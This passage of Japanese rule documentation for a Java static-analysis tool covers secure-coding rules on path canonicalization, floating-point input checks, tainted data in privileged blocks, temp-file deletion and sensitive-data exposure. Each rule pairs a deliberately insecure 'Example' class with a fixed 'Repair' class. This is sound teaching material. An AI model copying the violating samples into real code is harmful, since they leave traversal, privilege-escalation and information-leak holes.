このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2.3



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
絶対パス名または相対パス名には、シンボリック (ソフト) リンク、ハード リンク、ショートカット、シャドウ、エイリアス、
ジャンクションなどのファイル リンクが含まれる場合があり、それらによって、攻撃者がディレクトリ トラバーサル攻撃や
パス名の脆弱性悪用を仕掛けることができる可能性があります。ディレクトリ トラバーサル ループホールは、指定された
作業ディレクトリ外のディレクトリで I/O 操作を可能にします。パス名脆弱性は、アクセスが制限されたリソースに対して、
通常とは異なる、しかし同等の名前を指定することを可能にします。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[検証メソッド名] パラメーターを使用して汚染されたデータを検証するメソッドを指定できます。
いずれかの検証メソッドが呼び出された後のパラメーター、ターゲット オブジェクト、
および戻り値は良性と判断されます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

  

</PRE>
<STRONG>
利点
</STRONG>
<PRE>
ファイル パスの正規化を強制し、アクセス制限されたリソースを未認可のアクセスから守ります。
正規化を行うと、特定のファイル パスの表現が 1 つしかないことを保証するのに役立ちます。
File.getCanonicalPath() メソッドは、すべてのプラットフォームのエイリアス、シンボリック
 (ソフト) リンク、ショートカットを解釈できます。".." などの特殊なファイル名が除去され、
 入力が単純化され、プラットフォームに応じた標準的な形式に変換されてから検証が行われるため、
 攻撃者が "../" などのシーケンスを使用して指定されたディレクトリの外へ出るのを防ぎます。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.io.File;

public abstract class Example
{
    public void processArg(String arg)
    {
        File f = new File(System.getProperty("user.home") + System.getProperty("file.separator") + arg);
        String absPath = f.getAbsolutePath();
        if (!validate(absPath)) { // 違反
            throw new IllegalArgumentException();
        }
    }

    public abstract boolean validate(String path);
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.io.File;
import java.io.IOException;

public abstract class Repair
{
    public void processArg(String arg)
        throws IOException
    {
        File f = new File(System.getProperty("user.home") + System.getProperty("file.separator") + arg);
        String canonicalPath = f.getCanonicalPath();
        if (!validate(canonicalPath)) { // 違反ではない
            throw new IllegalArgumentException();
        }
    }

    public abstract boolean validate(String path);
}

教育とトレーニング

Directory Traversal
Video: <A target="_blank" HREF="https://vimeo.com/303808203">https://vimeo.com/303808203</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_3-Directory-Traversal.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_3-Directory-Traversal.pdf</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
FIO16-J. Canonicalize path names before validating them 
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/FIO16-J.+Canonicalize+path+names+before+validating+them">https://www.securecoding.cert.org/confluence/display/java/FIO16-J.+Canonicalize+path+names+before+validating+them</A>

Java Platform, Standard Edition (Java SE) 8, Class File
<A target="_blank" HREF="https://docs.oracle.com/javase/7/docs/api/java/io/File.html#getAbsolutePath%28%29">https://docs.oracle.com/javase/7/docs/api/java/io/File.html#getAbsolutePath%28%29</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.FPEXC" href="#top">[Top]</a><br/><br/><STRONG>
例外値がないか浮動小数点値の入力をチェックする [BD.SECURITY.FPEXC]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
「プログラムは、すべての浮動小数点型の入力値 (特にユーザーから取得したもの) に予期しない例外
値が含まれていないことを確認する必要があります。そのために Double.isNaN(double d) および 
Double.isInfinite(double d) を使用することができます。」
[SEI CERT Oracle Coding Standard for Java; NUM08-J. Check floating-point inputs for exceptional values]

このルールは、浮動小数点型の入力値に例外値 ("NaN"、"Infinity" または "-Infinity" など) が含まれて
いないかどうかをチェックしていない値を使用して演算または比較を行っている場合に違反をレポートします。

以下のメソッドおよびコンストラクターは例外値を返す可能性があります。
    Class java.lang.Double:
      * new Double(String s)
      * Double.valueOf(String s)
      * Double.parseDouble(String s)
    Class java.lang.Float:
      * new Float(String s)
      * Float.valueOf(String s)
      * Float.parseFloat(String s) 
    Class java.util.Scanner:
      * nextDouble()
      * nextFloat()    
    
値が NaN かどうかをチェックするメソッド:
    Class java.lang.Double:
      * Double.isNan(double v)
      * isNaN()
    Class java.lang.Float:
      * Float.isNan(float v)
      * isNaN()

値が Infinity または -Infinity かどうかをチェックするメソッド:   
    Class java.lang.Double:
      * Double.isInfinite(double v)
      * isInfinite()
    Class java.lang.Float:
      * Float.isInfinite(float v)
      * isInfinite()
	    
値が NaN、Infinity および -Infinity ではないことをチェックするメソッド:
    Class java.lang.Double:
      * Double.isFinite(double v)
    Class java.lang.Float:
      * Float.isFinite(float v)
		  	       

</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.4.0


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
コードを悪意のある攻撃から保護するのに役立ちます。


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    double currentBalance; // ユーザーの残高

    void doDeposit(String userInput)
    {
        double val = 0;
        try {
            val = Double.valueOf(userInput);
        } catch (NumberFormatException e) {
            // 入力フォーマット エラー処理
        }

        if (val &gt;= Double.MAX_VALUE - currentBalance) { // 違反
            // 範囲エラー処理
        }

        currentBalance += val;
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
Double.isNaN(double d) および Double.isInfinite(double d) メソッドを使用します。

public class Repair
{
    double currentBalance; // ユーザーの残高

    void doDeposit(String userInput)
    {
        double val = 0;
        try {
            val = Double.valueOf(userInput);
        } catch (NumberFormatException e) {
            // 入力フォーマット エラー処理
        }

        if (Double.isInfinite(val)) {
            // infinity エラー処理
            val = 0.0;
        }

        if (Double.isNaN(val)) {
            // NaN エラー処理
            val = 0.0;
        }

        if (val &gt;= Double.MAX_VALUE - currentBalance) { // 違反ではない
            // 範囲エラー処理
        }
        currentBalance += val;
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
NUM08-J. Check floating-point inputs for exceptional values
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/NUM08-J.+Check+floating-point+inputs+for+exceptional+values">https://wiki.sei.cmu.edu/confluence/display/java/NUM08-J.+Check+floating-point+inputs+for+exceptional+values</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.PRIVIL" href="#top">[Top]</a><br/><br/><STRONG>
特権付きのブロックで汚染されたデータを処理するのを避ける [BD.SECURITY.PRIVIL]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
﻿説明

このルールは、未検証のデータまたは信頼されていないデータ (汚染されたデータとも呼ばれます) が
特権付きブロックで使用されている場合に違反をレポートします。

このルールは、AccessController クラス (java.security.AccessController) の以下のメソッドで
汚染されたデータが使用されている場合に違反をレポートします。

	* static &lt;T&gt; T  doPrivileged(PrivilegedAction&lt;T&gt; action)
	* static &lt;T&gt; T 	doPrivileged(PrivilegedAction&lt;T&gt; action, AccessControlContext context)
	* static &lt;T&gt; T 	doPrivileged(PrivilegedAction&lt;T&gt; action, AccessControlContext context, 
								 Permission... perms)
	* static &lt;T&gt; T 	doPrivileged(PrivilegedExceptionAction&lt;T&gt; action)
	* static &lt;T&gt; T 	doPrivileged(PrivilegedExceptionAction&lt;T&gt; action, AccessControlContext context)
	* static &lt;T&gt; T 	doPrivileged(PrivilegedExceptionAction&lt;T&gt; action, AccessControlContext context, 
								 Permission... perms)
	* static &lt;T&gt; T 	doPrivilegedWithCombiner(PrivilegedAction&lt;T&gt; action)
	* static &lt;T&gt; T 	doPrivilegedWithCombiner(PrivilegedAction&lt;T&gt; action, AccessControlContext context, 
											 Permission... perms)
	* static &lt;T&gt; T 	doPrivilegedWithCombiner(PrivilegedExceptionAction&lt;T&gt; action)
	* static &lt;T&gt; T 	doPrivilegedWithCombiner(PrivilegedExceptionAction&lt;T&gt; action, 
											 AccessControlContext context, Permission... perms)



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2.3



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
汚染された入力に特権付きの操作を許可すると、権限昇格攻撃の原因になる場合があります。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。
    
[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。



</PRE>
<STRONG>
利点
</STRONG>
<PRE>
攻撃者が悪意のある入力を指定して権限昇格攻撃を行うのを防ぎます。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.security.AccessController;
import java.security.PrivilegedAction;

import javax.servlet.http.HttpServletRequest;

public abstract class Example
{
    public void privilegedMethod(HttpServletRequest request)
    {
        String fileName = request.getParameter("filename");
        FileInputStream fis = (FileInputStream)AccessController.doPrivileged(new PrivilegedAction()
        {
            public FileInputStream run()
            {
                try {
                    return new FileInputStream(fileName); // 違反
                } catch (FileNotFoundException e) {
                    return null;
                }
            }
        });
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.security.AccessController;
import java.security.PrivilegedAction;

import javax.servlet.http.HttpServletRequest;

public abstract class Repair
{
    public void privilegedMethodGood(HttpServletRequest request)
    {
        String fileName = validate(request.getParameter("filename"));
        FileInputStream fis = (FileInputStream)AccessController.doPrivileged(new PrivilegedAction()
        {
            public FileInputStream run()
            {
                try {
                    return new FileInputStream(fileName); // 違反ではない
                } catch (FileNotFoundException e) {
                    return null;
                }
            }
        });
    }

    public abstract String validate(Object obj);
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
SEC01-J. Do not allow tainted variables in privileged blocks 
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/SEC01-J.+Do+not+allow+tainted+variables+in+privileged+blocks">https://www.securecoding.cert.org/confluence/display/java/SEC01-J.+Do+not+allow+tainted+variables+in+privileged+blocks</A>

Java Platform, Standard Edition (Java SE) 8, Class AccessController
<A target="_blank" HREF="https://docs.oracle.com/javase/8/docs/api/java/security/AccessController.html">https://docs.oracle.com/javase/8/docs/api/java/security/AccessController.html</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.REMTMP" href="#top">[Top]</a><br/><br/><STRONG>
終了の前に一時ファイルを削除する [BD.SECURITY.REMTMP]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
﻿説明
このルールは、プログラム終了の前に一時ファイルが削除されていない場合、または
削除されていない可能性がある場合に違反をレポートします。

I. 一時ファイルとは、以下のメソッドを使用して作成されたファイルです。

1. java.io.File:
    * static File createTempFile(String prefix, String suffix)
    * static File createTempFile(String prefix, String suffix, File directory)   

2. java.nio.file.Files:
    * static Path createTempFile(Path dir, String prefix, String suffix, 
								 FileAttribute&lt;?&gt;... attrs)
    * static Path createTempFile(String prefix, String suffix, FileAttribute&lt;?&gt;... attrs)	
	
	
II. 一時ファイルを確実に削除するには、以下の方法があります。
  
1.  File オブジェクトに対して以下のメソッドを呼び出します:
    * boolean delete()
			
2. 一時ファイルへのパスを引数として以下のメソッドを呼び出します:
    * static void delete(Path path)
    * static boolean deleteIfExists(Path path)
 
3. 一時ファイルへのパスを Path とし、StandardOpenOption.DELETE_ON_CLOS を OpenOption として以下の
   メソッドを呼び出します:
   				   
   * static BufferedWriter newBufferedWriter(Path path, Charset cs, OpenOption... options)
   * static SeekableByteChannel newByteChannel(Path path, OpenOption... options)
   * static SeekableByteChannel newByteChannel(Path path, Set&lt;? extends OpenOption&gt; options, 
   											   FileAttribute&lt;?&gt;... attrs)
   * static OutputStream newOutputStream(Path path, OpenOption... options)
   * static Path write(Path path, byte[] bytes, OpenOption... options)
   * static Path write(Path path, Iterable&lt;? extends CharSequence&gt; lines, Charset cs, 
   					   OpenOption... options)
    


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2.3



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
プログラムを終了する前に一時ファイルを削除する必要があります。一時ファイルはアクションに必要な
リソースを消費し、攻撃者が機密データにアクセスするのを許す可能性があります。必要がなくなったら
一時ファイルを削除すると、ファイル名や他のリソースを再利用できます。各プログラムは、通常処理時に
一時ファイルを削除する責任があります。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
利点
</STRONG>
<PRE>
情報漏えいおよびリソースの枯渇を防ぎます。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class Example
{
    public static void method()
        throws IOException
    {
        File f = File.createTempFile("tempnam", ".tmp");
        FileOutputStream fop = null;
        try {
            fop = new FileOutputStream(f);
            String str = "Data";
            fop.write(str.getBytes());
            fop.flush();
        } finally {
            if (fop != null) {
                try {
                    fop.close();
                } catch (IOException x) {
                    // Handle error
                }
            }
        }
    } // 違反
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.io.BufferedWriter;
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.file.FileAlreadyExistsException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;

public class Repair
{
    public static void method()
    {
        Path tempFile = null;
        try {
            tempFile = Files.createTempFile("tempnam", ".tmp");
            try (BufferedWriter writer = Files.newBufferedWriter(tempFile, Charset.forName("UTF8"), StandardOpenOption.DELETE_ON_CLOSE)) { // NO VIOLATION
                // Write to file
            }
            System.out.println("Temporary file write done, file erased");
        } catch (FileAlreadyExistsException x) {
            System.err.println("File exists: " + tempFile);
        } catch (IOException x) {
            // Some other sort of failure, such as permissions.
            System.err.println("Error creating temporary file: " + x);
        }
    } // 違反ではない
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
FIO03-J. Remove temporary files before termination 
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/FIO03-J.+Remove+temporary+files+before+termination">https://www.securecoding.cert.org/confluence/display/java/FIO03-J.+Remove+temporary+files+before+termination</A>

Java Platform, Standard Edition (Java SE) 8, Class File
<A target="_blank" HREF="https://docs.oracle.com/javase/7/docs/api/java/io/File.html">https://docs.oracle.com/javase/7/docs/api/java/io/File.html</A>

Java Platform, Standard Edition (Java SE) 8, Class Files
<A target="_blank" HREF="https://docs.oracle.com/javase/7/docs/api/java/nio/file/Files.html">https://docs.oracle.com/javase/7/docs/api/java/nio/file/Files.html</A>

Java Platform, Standard Edition (Java SE) 8, Class Path
<A target="_blank" HREF="https://docs.oracle.com/javase/7/docs/api/java/nio/file/Path.html">https://docs.oracle.com/javase/7/docs/api/java/nio/file/Path.html</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.SENS" href="#top">[Top]</a><br/><br/><STRONG>
機密データの公開を防止する [BD.SECURITY.SENS]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、機密的な内部データにエンド ユーザーがアクセスできる状況を検出します。
そのような状況では、攻撃者がプログラムを洞察できるため、アプリケーションの安全性が
脅かされます。攻撃者は、正常なプログラムの流れを破壊したり、
不正にアクセス権限を得たりするためのリクエストを作成できます。

機密データのソース:

   * toString(): toString() の実装はオブジェクト内部の情報を表示することがあります。
     このメソッドはエンドユーザーが利用できるようにするべきではありません。

   * リフレクション: リフレクションを使用すると、実行時にプログラムの内部構造を確認し、変更できます。
     そのため、リフレクション メカニズムは機密上注意を要するとみなされます。
     
      * java.lang.Class
      * java.reflect.AccessibleObject
      * java.lang.reflect.Field
      * java.lang.reflect.Method
      * java.lang.reflect.Constructor

   * 例外: throw された例外はユーザーから隠すべきです。
     java.lang.Throwable のすべてのインスタンスは機密情報です。

   * 環境: 環境変数にはシステムの一般ユーザーから隠すべき情報が含まれている場合があります。

   * システム プロパティ

このルールは、以下を通じて機密データが漏えいしていないかをチェックします。

   * AWT API
   * Swing API
   * SWT API
   * JFace API
   * Apache ECS API
   * java.io.Console
   * javax.servlet.ServletOutputStream
   * javax.servlet.jsp.JspWriter
   * java.io.PrintWriter


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.1 


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 機密データの公開


OWASP の 2017 年 アプリケーション脆弱性トップ 10 の #3 「A3 - 機微な情報の露出」を推進します。

安全性が懸案事項であるアプリケーションにとって、機密情報の漏洩は大きな問題です。
数多くのセキュリティ攻撃は、アプリケーションの構造に対する攻撃者の洞察に基づいています。
攻撃者はこの洞察によって、アプリケーションの異常動作を引き起こしたり攻撃者により高い権限を許可させる入力データを考え出すことができます。
したがって、セキュリティが重要なアプリケーションでは、プログラムの内部構造に関連する
情報を隠し、ユーザーに決して公開しないことが重要です。
特に、例外、スタック トレース、メソッド名、クラス名は決してエンド ユーザーに
公開してはいけません。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[危険なメソッド] パラメーターを使用すると、危険なメソッドとして扱われるメソッドを定義できます。
汚染されたデータが危険なメソッドの引数として渡されている場合、ルールは違反をレポート
します。
危険なメソッドメソッドを設定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを危険なメソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
機密情報の漏えいを防ぎ、悪意のある攻撃に対してコードを安全に保つのに役立ちます。


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
違反がレポートされる例を 2 つ挙げます。

import java.io.IOException;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.swing.JOptionPane;

public class Example
{
    public void doGet(HttpServletRequest req, HttpServletResponse resp)
    {
        try {
            Class.forName("someClass");
        } catch (Exception e) {
            try {
                resp.getWriter().write(e.getMessage()); // 違反
            } catch (IOException e1) {}
        }
    }

    public void method()
    {
        Object obj = new Object();
        JOptionPane.showMessageDialog(null, "Object " + obj.toString(), "Message", JOptionPane.INFORMATION_MESSAGE); // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
次のコードでは違反がレポートされません。

import java.io.IOException;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.swing.JOptionPane;

public abstract class Repair
{
    public void doGet(HttpServletRequest req, HttpServletResponse resp)
    {
        try {
            Class.forName("someClass");
        } catch (Exception e) {
            try {
                resp.getWriter().write(validate(e.getMessage())); // 違反ではない
            } catch (IOException e1) {}
        }
    }

    public void method()
    {
        Object obj = new Object();
        JOptionPane.showMessageDialog(null, "Object " + validate(obj.toString()), "Message", JOptionPane.INFORMATION_MESSAGE); // 違反ではない
    }

    /** do the validation of the string here */
    public abstract String validate(String str);
}

教育とトレーニング

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/b3718deb-9c17-4b07-a5fe-6a6abaf0f96e">https://app.hackedu.com/link/b3718deb-9c17-4b07-a5fe-6a6abaf0f96e</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A3 - Sensitive Data Exposure):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure</A>

OWASP API Security Top 10-2019
API3-Excessive Data Exposure
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa3-excessive-data-exposure.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa3-excessive-data-exposure.md</A>

PCI Data Security Standard 3.2
6.5.5 Improper error handling
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/200.html">https://cwe.mitre.org/data/definitions/200.html</A>

CWE-209: Generation of Error Message Containing Sensitive Information
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/209.html">https://cwe.mitre.org/data/definitions/209.html</A>

CWE-311: Missing Encryption of Sensitive Data
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/311.html">https://cwe.mitre.org/data/definitions/311.html</A>

CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/497.html">https://cwe.mitre.org/data/definitions/497.html</A>

SEI CERT Oracle Coding Standard for Java
FIO13-J. Do not log sensitive information outside a trust boundary
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/FIO13-J.+Do+not+log+sensitive+information+outside+a+trust+boundary">https://wiki.sei.cmu.edu/confluence/display/java/FIO13-J.+Do+not+log+sensitive+information+outside+a+trust+boundary</A>

Web Application Security Consortium:
<A target="_blank" HREF="http://www.webappsec.org/projects/threat/classes/information_leakage.shtml">http://www.webappsec.org/projects/threat/classes/information_leakage.shtml</A>

OWASP Code Review Guide 2008 V1.1
Reviewing by technical control: Error Handling p. 83
Reviewing Code for Logging Issues p. 153

Tags: OWASP, PCI-DSS, CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.SENSLOG" href="#top">[Top]</a><br/><br/><STRONG>
ログ ファイルに書き込む関数に機密データを渡さない [BD.SECURITY.SENSLOG]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

「ログ ファイルに書き込まれた情報は機密上重要な性質を持ち、攻撃者に重要な
手引きを与えたり、ユーザーに関する機密情報を公開する可能性があります。」
[CWE-532] 

このルールは、機密データがログ ファイルに書き込まれている場合に違反を
レポートします。
ルールをパラメータライズして機密データを定義し、ログ記録関メソッドを指定する
必要があります。「パラメーター」セクションを参照してください。DESCRIPTION



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>

2020.1



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

「すべての情報をログに記録することは、開発段階では役に立つかもしれませんが、
製品リリースの前にログ記録レベルを適切に設定し、機密上重要なユーザーデータや
システム情報が潜在的な攻撃者に誤って公開されることがないようにすることが
重要です。」[CWE-532] 



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[安全なデータ処理メソッド] パラメーターを使用すると、機密データを安全な値に変換するメソッドを指定できます。
関数を設定するには、以下の列に値を入力します。

- [有効]  安全化メソッドを有効または無効にします。無効化すると、ルールはメソッドによって処理された値を安全として扱いません。

- [完全修飾型名または (ワイルドカード)] 列にはメソッドを宣言する型の
  完全修飾名を指定する必要があります。
  任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
  に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
  非インスタンス メソッドの両方に適用されることに注意してください。

- [安全化されたデータを返す] 列を有効に設定した場合、メソッドは戻り値を安全化します。

- [安全化されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを安全化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
安全化される場合は '*' を指定します。
デフォルトでは、次のメソッドが処理したデータが安全化されるとみなされます。
 - '[Ss]ecure*'

